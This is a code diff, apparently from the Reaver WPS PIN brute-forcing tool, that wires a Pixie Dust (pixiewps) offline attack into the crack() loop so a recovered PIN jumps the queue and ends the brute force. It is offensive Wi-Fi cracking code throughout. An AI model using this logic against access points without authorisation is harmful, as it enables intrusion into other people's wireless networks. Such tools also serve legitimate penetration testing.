@@ -33,6 +33,7 @@
 
 #include "cracker.h"
 #include "utils/vendor.h"
+#include "pixie.h"
 
 /* Brute force all possible WPS pins for a given access point */
 void crack()
@@ -169,6 +170,8 @@ void crack()
 		{
 			cprintf(WARNING, "[+] Trying pin \"%s\"\n", pin);
 		}
+		/* Set the trying pin for global access */
+		set_pin(pin);
 
 		/* 
 		 * Reassociate with the AP before each WPS exchange. This is necessary as some APs will
@@ -205,7 +208,9 @@ void crack()
 			case KEY_REJECTED:
 				fail_count = 0;
 				pin_count++;
-				advance_pin_count();
+				if (!get_pin_string_mode()) {
+					advance_pin_count();
+				}
 				break;
 			/* Got it!! */
 			case KEY_ACCEPTED:
@@ -242,11 +247,51 @@ void crack()
 		{
 			wps_deinit(get_wps());
 			set_wps(NULL);
+			/* Check pixiewps attack */
+			if (pixie.do_pixie) {
+				if (pixie.pin && strcmp(get_pin(), pixie.pin) != 0) {
+					/* check current pin is string pin */
+					if (get_pin_string_mode()) {
+						/* cancel string pin mode */
+						set_pin_string_mode(0);
+					}
+					/* Clean static pin */
+					set_static_p1(NULL);
+					set_static_p2(NULL);
+					parse_static_pin(pixie.pin);
+					/* check pixie.pin is valid WPS pin */
+					if (is_valid_pin(pixie.pin)) {
+						/* Insert pixie.pin into current index of p1 and p2 array */
+						if (jump_p1_queue(get_static_p1()) > 0) {
+							cprintf(VERBOSE, "[+] Updated P1 array\n");
+						}
+						if (jump_p2_queue(get_static_p2()) > 0) {
+							cprintf(VERBOSE, "[+] Updated P2 array\n");
+						}
+					}
+					/* reset max attempt for stop next attempt */
+					set_max_pin_attempts(pin_count+1);
+				}
+				if (pixie.pin) {
+					/* Cancel pixiewps attack */
+					pixie.do_pixie = 0;
+					if (is_valid_pin(pixie.pin)) {
+						/* set key status to KEY2_WIP for to can save the .wpc file */
+						set_key_status(KEY2_WIP);
+					}
+					pixie_free();
+				}
+			}
+			/* If we NOT have cracked the pin, clean the trying pin */
+			set_pin(NULL);
 		}
-		/* If we have cracked the pin, save a copy */
 		else
 		{
-			set_pin(pin);
+			/* free pixie if current pin is equal discovered pin by pixiewps */
+			if (pixie.do_pixie) {
+				pixie.do_pixie = 0;
+				pixie_free();
+			}
 		}
 		free(pin);
 		pin = NULL;
